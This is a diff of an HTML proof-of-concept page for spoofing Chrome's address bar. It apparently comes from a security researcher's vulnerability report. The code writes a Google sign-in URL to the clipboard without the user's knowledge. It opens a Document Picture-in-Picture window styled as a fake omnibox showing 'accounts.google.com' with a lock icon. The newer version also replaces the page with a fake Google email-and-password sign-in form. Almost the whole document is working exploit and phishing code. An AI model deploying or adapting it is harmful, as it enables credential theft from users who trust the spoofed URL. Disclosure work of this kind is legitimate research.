@@ -2,62 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Omnibox Obscuring via Document PiP - FARISSAL B</title>
+    <title>PoC: Chrome Omnibox Spoofing via DPiP - FARISSAL B</title>
     <style>
-        body { font-family: sans-serif; background: #111; color: #0f0; text-align: center; padding: 50px; }
-        .terminal { border: 1px solid #0f0; padding: 20px; display: inline-block; border-radius: 10px; background: #000; }
-        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        #log { margin-top: 20px; text-align: left; font-size: 12px; color: #888; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #1e1e1e; padding: 40px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; text-align: center; max-width: 500px; }
+        h1 { color: #4285f4; margin-bottom: 10px; }
+        p { color: #aaa; margin-bottom: 30px; }
+        #attackBtn { background: #4285f4; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; transition: 0.3s; font-weight: bold; width: 100%; }
+        #attackBtn:hover { background: #357ae8; transform: scale(1.02); }
+        .log-box { margin-top: 20px; background: #000; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 12px; text-align: left; color: #0f0; border: 1px solid #0f0; height: 100px; overflow-y: auto; }
+        .warning { color: #ff4444; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h1>URGENT: SECURITY RESEARCH</h1>
-    <p>Researcher: <b>FARISSAL B</b></p>
-    <p id="status">Status: Awaiting Interaction...</p>
-    <button id="startBtn">1. INITIALIZE ATTACK VECTOR</button>
-    <div id="log"></div>
+<div class="card">
+    <h1>Security Research</h1>
+    <p>Target: Chrome Omnibox Boundary Enforcement<br>Researcher: <b>FARISSAL B</b></p>
+    
+    <button id="attackBtn">EXECUTE SPOOFING ATTACK</button>
+
+    <div class="log-box" id="logBox">
+        [SYSTEM] Awaiting user gesture...
+    </div>
 </div>
 
 <script>
-    const log = document.getElementById('log');
-    const status = document.getElementById('status');
+    const logBox = document.getElementById('logBox');
+    const addLog = (msg, danger = false) => {
+        const entry = document.createElement('div');
+        entry.innerHTML = `> ${danger ? '<span class="warning">!</span> ' : ''}${msg}`;
+        logBox.appendChild(entry);
+        logBox.scrollTop = logBox.scrollHeight;
+    };
 
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        // Tiru Alesandro: Masukin payload ke clipboard secara diam-diam
+    document.getElementById('attackBtn').addEventListener('click', async () => {
         try {
-            await navigator.clipboard.writeText("https://accounts.google.com/signin/v2/challenge/pwd");
-            log.innerHTML += "<div>[SYSTEM] Payload copied to clipboard...</div>";
-        } catch (e) {}
+            // 1. Copy payload to clipboard (Alesandro Style)
+            await navigator.clipboard.writeText("https://accounts.google.com/signin/v2/identifier");
+            addLog("Payload copied to clipboard.");
 
-        // Tiru Alesandro: Buka jendela PiP dengan ukuran besar atau posisi strategis
-        const pipWin = await documentPictureInPicture.requestWindow({
-            width: 800, // Lebar biar nutupin Omnibox
-            height: 100, // Tipis biar dikira bar alamat
-            preferInitialWindowPlacement: true 
-        });
+            // 2. Open Document PiP
+            const pipWin = await documentPictureInPicture.requestWindow({
+                width: 900, // Lebar menutupi Omnibox
+                height: 120, // Pas untuk area bar alamat
+            });
 
-        status.innerText = "STATUS: PIP OVERLAY ACTIVE";
-        log.innerHTML += "<div>[VULN] PiP Window Injected at Y: " + pipWin.screenY + "</div>";
+            addLog("PiP Window Initialized.");
 
-        // Tiru Alesandro: UI yang sangat meyakinkan
-        pipWin.document.body.innerHTML = `
-            <div style="background: white; height: 100vh; display: flex; align-items: center; padding: 0 20px; border-bottom: 2px solid #1a73e8;">
-                <img src="https://www.google.com/favicon.ico" width="18" style="margin-right: 10px;">
-                <span style="font-family: sans-serif; font-size: 14px; color: #202124;">
-                    <b>Secure Connection:</b> accounts.google.com
-                </span>
-                <span style="margin-left: auto;">🔒</span>
-            </div>
-        `;
+            // 3. Inject Spoofing UI
+            pipWin.document.body.style.margin = "0";
+            pipWin.document.body.style.overflow = "hidden";
+            pipWin.document.body.innerHTML = `
+                <div style="background: #ffffff; height: 100vh; display: flex; align-items: center; padding: 0 20px; font-family: sans-serif; border-bottom: 2px solid #4285f4; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
+                    <div style="background: #f1f3f4; border-radius: 24px; padding: 8px 20px; flex-grow: 1; display: flex; align-items: center; gap: 12px; border: 1px solid #dfe1e5;">
+                        <img src="https://www.google.com/favicon.ico" width="18">
+                        <span style="color: #202124; font-size: 15px;">https://accounts.google.com/signin/v2</span>
+                        <span style="color: #5f6368; margin-left: auto;">🔒</span>
+                    </div>
+                </div>
+            `;
 
-        // Tiru Alesandro: Logic monitoring buat bukti laporan
-        setInterval(() => {
-            if (pipWin.screenY < 50) {
-                log.innerHTML += "<div style='color:red;'>[ALERT] Omnibox Obscured! Coordinate Y: " + pipWin.screenY + "</div>";
-            }
-        }, 500);
+            // 4. Persistence & Boundary Monitoring (The Evidence)
+            const checkBypass = setInterval(() => {
+                const y = pipWin.screenY;
+                if (y < 40) {
+                    addLog(`BOUNDARY BYPASS DETECTED! Y: ${y}`, true);
+                }
+                if (pipWin.closed) {
+                    clearInterval(checkBypass);
+                    addLog("Attack Window Closed.");
+                }
+            }, 500);
+
+            // 5. Interaction Test (Phishing Form di halaman utama)
+            document.body.innerHTML = `
+                <div class="card">
+                    <h2 style="color:#fff">Sign in</h2>
+                    <p>Use your Google Account</p>
+                    <input type="email" placeholder="Email or phone" style="width:100%; padding:15px; margin-bottom:10px; border-radius:5px; border:1px solid #333; background:#111; color:#fff;">
+                    <input type="password" placeholder="Enter your password" style="width:100%; padding:15px; margin-bottom:20px; border-radius:5px; border:1px solid #333; background:#111; color:#fff;">
+                    <button style="background:#4285f4; color:#fff; border:none; padding:12px 24px; border-radius:5px; width:100%; font-weight:bold;">Next</button>
+                    <p style="margin-top:20px; color:#4285f4; font-size:12px;">Instruction: Drag the PiP window to the top and try to type here.</p>
+                </div>
+            `;
+
+        } catch (e) {
+            addLog("Error: " + e.message, true);
+        }
     });
 </script>
 </body>
